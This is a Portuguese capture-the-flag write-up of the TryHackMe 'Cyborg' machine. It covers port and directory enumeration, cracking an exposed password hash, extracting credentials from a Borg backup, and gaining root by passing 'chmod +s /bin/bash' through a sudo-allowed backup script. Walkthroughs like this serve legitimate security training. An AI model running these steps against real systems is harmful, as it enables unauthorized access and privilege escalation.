<h1><b>Segue Writeup da maquina Cyborg do Try Hack Me</h1>

<b>Enumeração das portas com NMAP

```
┌──(xnv㉿kali)-[~]
└─$ nmap -A 10.10.162.202
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-18 01:03 EDT
Nmap scan report for 10.10.162.202 (10.10.162.202)
Host is up (0.23s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 db:b2:70:f3:07:ac:32:00:3f:81:b8:d0:3a:89:f3:65 (RSA)
|   256 68:e6:85:2f:69:65:5b:e7:c6:31:2c:8e:41:67:d7:ba (ECDSA)
|_  256 56:2c:79:92:ca:23:c3:91:49:35:fa:dd:69:7c:ca:ab (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 59.38 seconds
```

<b>Enumeração de arquivos e pastas com o WFUZZ.

```
┌──(xnv㉿kali)-[~]
└─$ wfuzz -c -w /usr/share/dirb/wordlists/common.txt --hc 404,403 -u http://10.10.162.202/FUZZ -t 100

000000001:   200        375 L    968 W      11321 Ch    "http://10.10.162.202/"
000000286:   301        9 L      28 W       314 Ch      "admin"
000001505:   301        9 L      28 W       312 Ch      "etc"
000002020:   200        375 L    968 W      11321 Ch    "index.html"  
```

<b>Depois de verificar os resultados encontrei esse arquivo.
  
```
http://10.10.162.202/etc/squid/passwd
music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.
```

<b>Com o Hash que conseguir, coloquei no arquivo "hash", e quebrei ele com o john
  
![1](https://user-images.githubusercontent.com/90646635/133877733-130af2b9-a08e-4ad1-a092-cc7fc676815e.PNG)

Voltando para a página tem o Download do arquivo, "archive.tar"

![2](https://user-images.githubusercontent.com/90646635/133878577-5a93b701-5fab-4828-9247-f39814d5359a.PNG)

Dentro do arquivo baixado tem um arquivo "Readme", que te leva a documentação da aplicação chamada "borg"

```
┌──(xnv㉿kali)-[~/…/home/field/dev/final_archive]
└─$ cat README      
This is a Borg Backup repository.
See https://borgbackup.readthedocs.io/
```

<b>Então é só instalar a aplicação borg, conforme documentação.

```
┌──(xnv㉿kali)-[~/…/home/field/dev/final_archive]
└─$ sudo apt install borgbackup
```

<b>E seguindo a documentação vamos extrair os arquivos que estão ocultos, ele pedirá uma senha, essa senha conseguimos com o hash anteriormente.
  
```
┌──(xnv㉿kali)-[~/…/cyborg/home/field/dev]
└─$ borg extract final_archive::music_archive
Enter passphrase for key /home/xnv/thm/cyborg/home/field/dev/final_archive:
```

<b>Depois de extrair os arquivos ocultos encontraremos um login e senha, para logarmos via SSH.

![4](https://user-images.githubusercontent.com/90646635/133879118-bccf411d-6729-4e21-9b53-949fb8d2a030.PNG)


<b>E então encontraremos a flag user
  
```
alex@ubuntu:~$ cat user.txt 
flag{*********************************}
```
<b>Dando um sudo -l
  

```
alex@ubuntu:~$ sudo -l
Matching Defaults entries for alex on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alex may run the following commands on ubuntu:
    (ALL : ALL) NOPASSWD: /etc/mp3backups/backup.sh
  
```
<b> Podemos ver que no arquivo backup.sh podemos executar o sudo sem precisar da senha, então vamos usar ele para conseguir o root.
  
```
alex@ubuntu:~$ sudo /etc/mp3backups/backup.sh -c "chmod +s /bin/bash"
alex@ubuntu:~$ /bin/bash -p
```
<b>E então conseguimos o root.
  
```
bash-4.3# 
```

<b>E então é só dar um cat no arquivo root.txt
  
```
bash-4.3# cat /root/root.txt
flag{***********************************}
```
